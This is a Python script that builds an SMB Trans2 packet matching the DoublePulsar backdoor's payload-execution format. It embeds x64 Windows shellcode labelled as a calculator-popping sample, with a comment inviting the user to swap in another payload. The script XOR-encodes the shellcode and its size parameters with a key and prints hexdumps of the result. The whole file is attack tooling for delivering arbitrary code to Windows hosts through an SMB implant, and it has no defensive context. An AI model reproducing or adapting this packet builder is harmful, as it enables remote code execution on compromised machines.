import ctypes
import struct
from socket import htons

# pop calculator shellcode - this is a sample.  Change according to your payload
payload_shellcode = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
payload_shellcode += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
payload_shellcode += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
payload_shellcode += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
payload_shellcode += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
payload_shellcode += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
payload_shellcode += b"\x48\x83\xec\x20\x41\xff\xd6"

def int2le(integer, pad):
    """integer to little endian buffer."""
    buf = []
    while integer:
        buf.append(chr(integer & 0xff))
        integer >>= 8
        pad -= 1
    while pad > 0:
        buf.append('\x00')
        pad -= 1
    if not buf:
        return '\x00'
    return ''.join(buf)


def byte_xor(data, key):
    for i in range(len(data)):
        data[i] ^= key[i % len(key)]
    return


def hexdump(data, length=16):
    """
    Prints a classic hexdump of the given data.

    :param data: The bytes or bytearray to dump.
    :param length: Number of bytes per line.
    """
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("Input data must be bytes or bytearray.")

    for i in range(0, len(data), length):
        chunk = data[i:i + length]

        # Hex representation
        hex_bytes = ' '.join(f"{b:02x}" for b in chunk)

        # Make two blocks of 8 bytes for readability
        hex_bytes = '  '.join([hex_bytes[:24], hex_bytes[24:]]) if len(chunk) > 8 else hex_bytes

        # ASCII representation
        ascii_bytes = ''.join((chr(b) if 32 <= b <= 126 else '.') for b in chunk)

        print(f"{i:08x}  {hex_bytes:<48}  {ascii_bytes}")


# === Struct Definitions ===

class NetBios(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('type', ctypes.c_uint16),
        ('length', ctypes.c_uint16)
    ]


class SMBHeader(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('protocol', ctypes.c_ubyte * 4),
        ('command', ctypes.c_ubyte),
        ('NTSTATUS', ctypes.c_uint32),
        ('flag', ctypes.c_ubyte),
        ('flag2', ctypes.c_uint16),
        ('PIDHigh', ctypes.c_uint16),
        ('SecuritySignature', ctypes.c_ubyte * 8),
        ('reserves', ctypes.c_uint16),
        ('tid', ctypes.c_uint16),
        ('pid', ctypes.c_uint16),
        ('uid', ctypes.c_uint16),
        ('mid', ctypes.c_uint16)
    ]


class SMBTrans2ExecPacket(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('wordCount', ctypes.c_ubyte),
        ('totalParameterCount', ctypes.c_uint16),
        ('totalDataCount', ctypes.c_uint16),
        ('maxParameterCount', ctypes.c_uint16),
        ('maxDataCount', ctypes.c_uint16),
        ('maxSetupCount', ctypes.c_ubyte),
        ('reserved', ctypes.c_ubyte),
        ('flags', ctypes.c_uint16),
        ('timeout', ctypes.c_uint32),
        ('reserved2', ctypes.c_uint16),
        ('parameterCount', ctypes.c_uint16),
        ('parameterOffset', ctypes.c_uint16),
        ('dataCount', ctypes.c_uint16),
        ('dataOffset', ctypes.c_uint16),
        ('setupCount', ctypes.c_ubyte),
        ('reserved3', ctypes.c_ubyte),
        ('subcommand', ctypes.c_uint16),
        ('byteCount', ctypes.c_uint16),
        ('padding', ctypes.c_ubyte)
    ]


class SMBParameters(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('SESSION_SETUP_PARAMETERS', ctypes.c_ubyte * 12)
    ]


class SMBDATA(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('SMBDATA', ctypes.c_ubyte * 4096)
    ]


if __name__ == '__main__':
    # === Example Data ===

    bytesLeft = 4096  # Example size of remaining data
    treeid = 0x0800  # Example tree ID
    userid = 0x0800  # Example user ID

    # Calculate packet size
    packet_size = (
            ctypes.sizeof(NetBios) +
            ctypes.sizeof(SMBHeader) +
            ctypes.sizeof(SMBTrans2ExecPacket) +
            ctypes.sizeof(SMBParameters) + bytesLeft
    )

    # Initialize packet buffer
    last_packet = bytearray(packet_size)

    # Overlay structures on packet buffer
    nb = NetBios.from_buffer(last_packet, 0)
    smb = SMBHeader.from_buffer(last_packet, ctypes.sizeof(NetBios))
    trans2 = SMBTrans2ExecPacket.from_buffer(last_packet, ctypes.sizeof(NetBios) + ctypes.sizeof(SMBHeader))
    smb_params_offset = ctypes.sizeof(NetBios) + ctypes.sizeof(SMBHeader) + ctypes.sizeof(SMBTrans2ExecPacket)
    smb_params = SMBParameters.from_buffer(last_packet, smb_params_offset)
    SMBDATA_offset = smb_params_offset + ctypes.sizeof(SMBParameters)

    # === Fill NetBios Header ===

    nb.type = 0x00
    nb.length = htons(
        # ctypes.sizeof(NetBios) +
        ctypes.sizeof(SMBHeader) +
        ctypes.sizeof(SMBTrans2ExecPacket) +
        ctypes.sizeof(SMBParameters)
        + bytesLeft
    )

    # === Fill SMB Header ===

    smb.protocol[:] = (0xFF, ord('S'), ord('M'), ord('B'))
    smb.command = 0x32
    smb.NTSTATUS = 0x00000000
    smb.flag = 0x18
    smb.flag2 = 0xc007
    smb.PIDHigh = 0x0000
    for i in range(8):
        smb.SecuritySignature[i] = 0
    smb.reserves = 0x0000
    smb.tid = treeid
    smb.pid = 0xfeff
    smb.uid = userid
    smb.mid = 0x42

    # === Fill Trans2 Packet ===

    trans2.wordCount = 15
    trans2.totalParameterCount = 12
    trans2.totalDataCount = bytesLeft
    trans2.maxParameterCount = 1
    trans2.maxDataCount = 0
    trans2.maxSetupCount = 0
    trans2.reserved = 0
    trans2.flags = 0x0000
    trans2.timeout = 0x001a8925
    trans2.reserved2 = 0x0000
    trans2.parameterCount = 12

    param_offset_len = ctypes.sizeof(SMBHeader) + ctypes.sizeof(SMBTrans2ExecPacket)
    dataOffset_len = param_offset_len + ctypes.sizeof(SMBParameters)

    trans2.parameterOffset = param_offset_len
    trans2.dataOffset = dataOffset_len
    trans2.dataCount = bytesLeft
    trans2.setupCount = 1
    trans2.reserved3 = 0x00
    trans2.subcommand = 0x000e
    trans2.byteCount = bytesLeft + 13
    trans2.padding = 0x00

    # === Debug / Print Offsets ===

    print(f"Offset of Parameters: {param_offset_len}")
    print(f"Offset of Data: {dataOffset_len}")

    # === Access SMB Data ===

    SMBDATA = memoryview(last_packet)[SMBDATA_offset:]

    # You can fill SMBDATA with whatever you need, example:
    # SMBDATA[:bytesLeft] = some_data
    for i in range(len(payload_shellcode)):
        SMBDATA[i] = payload_shellcode[i]

    key = 0x58581162
    int_bytes_xor_key = int(key)
    bytes_xor_key = int2le(int_bytes_xor_key, 0)
    b_bytes_xor_key = bytes(bytes_xor_key.encode())
    byte_xor(SMBDATA, b_bytes_xor_key)

    # Optional: Show raw bytes of the packet
    hexdump(last_packet)

    little_endian_bytes = key.to_bytes(4, byteorder='little')

    # old implementation
    print("Unsigned Integer: ", key)
    print("Little Endian Bytes: ", little_endian_bytes)
    print("Hex Representation: ", little_endian_bytes.hex())

    # better implementation
    little_endian_bytearray = bytearray(key.to_bytes(4, byteorder='little'))
    print("Unsigned Integer: ", key)
    print("Little Endian Bytearray: ", little_endian_bytearray)
    print("Hex Representation: ", little_endian_bytearray.hex())

    '''
    def uint_to_le_bytearray(value, length):
        return bytearray(value.to_bytes(length, byteorder='little'))
    
    # Example usage
    result = uint_to_le_bytearray(0x12345678, 4)
    print(result.hex())  # Output: 78563412
    '''

    print("\n\n")
    TotalPayloadSize = 0x507308  # 0x00000400
    ChunkSize = 4096  # 0x00000200
    Offset = 0  # 0x00000100

    # Create a 12-byte bytearray initialized to zeros
    smb_parameters = bytearray(12)

    # Pack the values into the bytearray in little-endian format
    smb_parameters[0:4] = TotalPayloadSize.to_bytes(4, byteorder='little')
    smb_parameters[4:8] = ChunkSize.to_bytes(4, byteorder='little')
    smb_parameters[8:12] = Offset.to_bytes(4, byteorder='little')

    # Output for verification
    print("smb_parameters:", smb_parameters)
    print("Hex:", smb_parameters.hex())

    byte_xor(smb_parameters, b_bytes_xor_key)

    print("XOR smb_parameters:", smb_parameters)
    print("XOR Hex:", smb_parameters.hex())

    hexdump(smb_parameters)
